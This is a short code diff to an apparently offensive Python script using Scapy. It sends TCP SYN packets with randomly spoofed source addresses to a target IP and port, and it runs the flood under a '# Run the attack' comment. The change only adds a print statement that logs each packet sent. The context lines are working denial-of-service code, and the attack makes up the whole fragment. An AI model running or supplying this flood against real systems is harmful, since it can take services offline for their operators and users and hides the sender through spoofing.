@@ -8,6 +8,7 @@ def syn_flood():
         ip_layer = IP(src=RandIP(), dst=target_ip)
         tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")  # SYN flag
         send(ip_layer / tcp_layer, verbose=False)
+        print(f"Sent SYN packet to {target_ip}:{target_port}")
 
 # Run the attack
 syn_flood()
